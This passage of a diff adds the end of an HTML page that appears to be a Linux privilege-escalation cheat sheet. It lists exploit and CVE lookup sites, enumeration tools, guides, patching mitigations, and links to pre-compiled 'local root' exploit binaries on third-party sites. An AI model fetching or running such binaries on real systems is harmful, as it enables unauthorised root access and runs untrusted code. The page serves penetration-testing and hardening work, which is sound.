+                    <li><a href="http://securityreason.com">http://securityreason.com</a></li>
+                    <li><a href="http://seclists.org/fulldisclosure/">http://seclists.org/fulldisclosure/</a></li>
+                    <li><a href="http://www.google.com">http://www.google.com</a></li>
+                </ul>
+
+                <h3>Finding more information regarding the exploit</h3>
+                <ul id="automated-enum">
+                    <li><a href="http://www.cvedetails.com">http://www.cvedetails.com</a></li>
+                    <li><a href="http://packetstormsecurity.org/files/cve/[CVE]">http://packetstormsecurity.org/files/cve/[CVE]</a></li>
+                    <li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]">http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]</a></li>
+                    <li><a href="http://www.vulnview.com/cve-details.php?cvename=[CVE]">http://www.vulnview.com/cve-details.php?cvename=[CVE]</a></li>
+                </ul>
+
+                <h3>(Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk</h3>
+                <ul id="automated-enum">
+                    <li><a href="http://tarantula.by.ru/localroot/">http://tarantula.by.ru/localroot/</a></li>
+                    <li><a href="http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/">http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/</a></li>
+                </ul>
+
+                <h3>Mitigations</h3>
+                <ul>
+                    <li>Is any of the above information easy to find? Try doing it!</li>
+                    <li>Setup a cron job which automates script(s) and/or 3rd party products</li>
+                    <li>Is the system fully patched? Kernel, operating system, all applications, their plugins, and web services:</li>
+                    <li><code>apt-get update && apt-get upgrade</code></li>
+                    <li><code>yum update</code></li>
+                    <li>Are services running with the minimum level of privileges required?</li>
+                    <li>For example, do you need to run MySQL as root?</li>
+                </ul>
+
+                <h3>Scripts - Can any of this be automated?</h3>
+                <ul id="automated-enum">
+                    <li><a href="http://pentestmonkey.net/tools/unix-privesc-check/">http://pentestmonkey.net/tools/unix-privesc-check/</a></li>
+                    <li><a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a></li>
+                    <li><a href="http://bastille-linux.sourceforge.net">http://bastille-linux.sourceforge.net</a></li>
+                </ul>
+
+                <h3>Other (quick) guides & Links: Enumeration</h3>
+                <ul id="automated-enum">
+                    <li><a href="http://www.0daysecurity.com/penetration-testing/enumeration.html">http://www.0daysecurity.com/penetration-testing/enumeration.html</a></li>
+                    <li><a href="http://www.microloft.co.uk/hacking/hacking3.htm">http://www.microloft.co.uk/hacking/hacking3.htm</a></li>
+                </ul>
+                
+                <h3>Other (quick) guides & Links: Misc</h3>
+                <ul id="automated-enum">
+                    <li><a href="http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf">http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf</a></li>
+                    <li><a href="http://pentest.cryptocity.net/files/clientsides/post_exploitation_fall09.pdf">http://pentest.cryptocity.net/files/clientsides/post_exploitation_fall09.pdf</a></li>
+                    <li><a href="http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html">http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html</a></li>
+                </ul>
+
+        </div>
+    </div>
+
+    <script>
+        function showTab(tabId) {
+            const tabs = document.querySelectorAll('.tab-content');
+            tabs.forEach(tab => {
+                tab.classList.remove('active');
+            });
+
+            const tabLinks = document.querySelectorAll('.tab');
+            tabLinks.forEach(tab => {
+                tab.classList.remove('active');
+            });
+
+            const selectedTab = document.getElementById(tabId);
+            selectedTab.classList.add('active');
+
+            const selectedTabLink = document.querySelector(`.tab[onclick="showTab('${tabId}')"]`);
+            selectedTabLink.classList.add('active');
+        }
+
+        function toggleDetails(id) {
+            const element = document.getElementById(id);
+            if (element.style.display === "none" || element.style.display === "") {
+                element.style.display = "block";
+            } else {
+                element.style.display = "none";
+            }
+        }
+    </script>
+</body>
+</html>
